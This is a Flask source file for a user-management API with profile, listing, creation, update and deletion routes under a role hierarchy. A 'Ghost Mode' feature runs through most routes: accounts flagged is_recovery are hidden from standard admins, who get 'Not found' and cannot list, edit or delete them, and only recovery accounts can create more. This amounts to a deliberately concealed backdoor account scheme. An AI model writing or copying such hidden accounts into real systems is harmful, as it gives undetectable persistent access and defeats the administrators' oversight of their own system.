import uuid
from datetime import datetime
from flask import Blueprint, request, jsonify, session
from werkzeug.security import generate_password_hash, check_password_hash
from core import load_users, save_users, admin_required, viewer_or_admin_required

users_bp = Blueprint('users', __name__)

def _get_current_user(users):
    current_username = session.get("username", "")
    return next((u for u in users if u.get("username") == current_username), None)

@users_bp.route("/api/profile", methods=["GET"])
@viewer_or_admin_required
def get_profile():
    users = load_users()
    user = _get_current_user(users)
    if not user:
        return jsonify({"error": "Profile not found."}), 404
    profile = {k: v for k, v in user.items() if k != "password_hash"}
    return jsonify(profile)

@users_bp.route("/api/profile", methods=["PUT"])
@viewer_or_admin_required
def update_profile():
    data = request.get_json() or {}
    users = load_users()
    user = _get_current_user(users)
    if not user:
        return jsonify({"error": "Profile not found."}), 404
    
    allowed_fields = ["full_name", "email", "phone", "designation", "department", "office_location"]
    for field in allowed_fields:
        if field in data:
            user[field] = data[field]
    
    if data.get("current_password") and data.get("new_password"):
        if not check_password_hash(user.get("password_hash", ""), data["current_password"]):
            return jsonify({"error": "Current password is incorrect."}), 403
        user["password_hash"] = generate_password_hash(data["new_password"])
    
    save_users(users)
    profile = {k: v for k, v in user.items() if k != "password_hash"}
    return jsonify({"success": True, "profile": profile})

@users_bp.route("/api/users", methods=["GET"])
@admin_required
def list_users():
    """List all users (admin only). Recovery accounts are hidden."""
    users = load_users()
    # Ghost Mode: Recovery accounts are hidden from standard admins
    current_user = _get_current_user(users)
    is_rec = current_user.get("is_recovery") if current_user else False
    
    result = [{k: v for k, v in u.items() if k != "password_hash"} 
              for u in users if is_rec or not u.get("is_recovery")]
    return jsonify(result)

@users_bp.route("/api/users", methods=["POST"])
@admin_required
def create_user():
    data = request.get_json() or {}
    role = (data.get("role") or "officer").strip().lower()
    current_role = (session.get("role") or "").lower()
    
    users = load_users()
    current_user = _get_current_user(users)

    # 1. SECURITY CHECK FIRST
    if role == "superadmin" and current_role != "superadmin":
        return jsonify({"error": "Unauthorized. Only SuperAdmins can create other SuperAdmins."}), 403
    
    # Define role hierarchy
    if current_role == "superadmin":
        valid_roles = ["superadmin", "admin", "officer", "viewer"]
    elif current_role == "admin":
        valid_roles = ["admin", "officer", "viewer"]
    else:
        valid_roles = []

    if role not in valid_roles:
        return jsonify({
            "error": f"Unauthorized role assignment. Your current role '{current_role}' is not permitted to create a '{role}' account.",
            "allowed_roles_for_you": valid_roles
        }), 403

    # 2. VALIDATION CHECKS
    required = ["username", "password", "full_name"]
    missing = [f for f in required if not data.get(f)]
    if missing:
        return jsonify({"error": f"Missing: {', '.join(missing)}"}), 400
    
    if any(u.get("username") == data["username"] for u in users):
        return jsonify({"error": "Username exists."}), 409
    
    # 3. EXECUTION
    new_user = {
        "user_id": str(uuid.uuid4()),
        "username": data["username"],
        "password_hash": generate_password_hash(data["password"]),
        "role": role,
        "full_name": data["full_name"],
        "email": data.get("email", ""),
        "phone": data.get("phone", ""),
        "designation": data.get("designation", ""),
        "department": data.get("department", ""),
        "office_location": data.get("office_location", ""),
        "is_active": data.get("is_active", True),
        "is_recovery": data.get("is_recovery", False) if current_user and current_user.get("is_recovery") else False,
        "created_at": datetime.now().isoformat() + "Z",
        "last_login": None
    }
    users.append(new_user)
    save_users(users)
    return jsonify({"success": True, "user": {k:v for k,v in new_user.items() if k != "password_hash"}}), 201

@users_bp.route("/api/users/<user_id>", methods=["GET"])
@admin_required
def get_user(user_id):
    """Get a specific user's profile (admin only). Recovery accounts are invisible."""
    users = load_users()
    user = next((u for u in users if u.get("user_id") == user_id), None)
    # Hide the existence of recovery accounts from standard admins
    current_user = _get_current_user(users)
    is_rec = current_user.get("is_recovery") if current_user else False
    
    if not user or (user.get("is_recovery") and not is_rec):
        return jsonify({"error": "Not found."}), 404
    return jsonify({k: v for k, v in user.items() if k != "password_hash"})

@users_bp.route("/api/users/<user_id>", methods=["PUT"])
@admin_required
def update_user(user_id):
    """Update any user's profile (admin only)."""
    data = request.get_json() or {}
    users = load_users()
    target_user = next((u for u in users if u.get("user_id") == user_id), None)
    
    # Standard admins can't even "see" that a recovery account exists to update it
    current_user = _get_current_user(users)
    is_rec = current_user.get("is_recovery") if current_user else False
    
    if not target_user or (target_user.get("is_recovery") and not is_rec):
        return jsonify({"error": "Not found."}), 404

    current_user = _get_current_user(users)
    current_role = (session.get("role") or "").lower()

    # 1. SECURITY CHECK
    target_role = target_user.get("role", "").lower()
    
    # Only superadmins can modify other superadmins
    if target_role == "superadmin" and current_role != "superadmin":
        return jsonify({"error": "Unauthorized. Only SuperAdmins can modify SuperAdmin accounts."}), 403
        
    # Admins cannot modify superadmins, but can modify anyone else
    if current_role == "admin" and target_role == "superadmin":
         return jsonify({"error": "Unauthorized. Admins cannot modify SuperAdmin accounts."}), 403

    if "role" in data:
        new_role = data["role"].lower()
        if current_role == "superadmin":
            valid_roles = ["superadmin", "admin", "officer", "viewer"]
        elif current_role == "admin":
            valid_roles = ["admin", "officer", "viewer"]
        else:
            valid_roles = []

        if new_role not in valid_roles:
            return jsonify({"error": f"Invalid role assignment: '{new_role}' is not allowed for your role."}), 403
        target_user["role"] = new_role

    # 2. EXECUTION
    allowed_fields = ["full_name", "email", "phone", "designation", "department", "office_location", "is_active"]
    for field in allowed_fields:
        if field in data:
            target_user[field] = data[field]
    
    if "is_recovery" in data and current_user and current_user.get("is_recovery"):
        target_user["is_recovery"] = data["is_recovery"]
    
    if data.get("new_password"):
        target_user["password_hash"] = generate_password_hash(data["new_password"])
    
    save_users(users)
    return jsonify({"success": True, "user": {k:v for k,v in target_user.items() if k != "password_hash"}})

@users_bp.route("/api/users/<user_id>", methods=["DELETE"])
@admin_required
def delete_user(user_id):
    """Delete a user (admin only)."""
    users = load_users()
    target_user = next((u for u in users if u.get("user_id") == user_id), None)
    
    # Hide the existence of recovery accounts from standard admins
    current_user = _get_current_user(users)
    is_rec = current_user.get("is_recovery") if current_user else False
    
    if not target_user or (target_user.get("is_recovery") and not is_rec):
        return jsonify({"error": "Not found."}), 404

    current_user = _get_current_user(users)
    current_role = (session.get("role") or "").lower()

    if target_user.get("username") == session.get("username"):
        return jsonify({"error": "Cannot delete self."}), 403

    target_role = target_user.get("role", "").lower()
    if target_role == "superadmin":
        if current_role != "superadmin":
            return jsonify({"error": "Unauthorized. Only SuperAdmins can delete other SuperAdmins."}), 403
    
    if current_role != "superadmin" and target_role == "admin":
        return jsonify({"error": "Unauthorized to delete admins."}), 403
    
    # 2. EXECUTION
    users = [u for u in users if u.get("user_id") != user_id]
    save_users(users)
    return jsonify({"success": True})
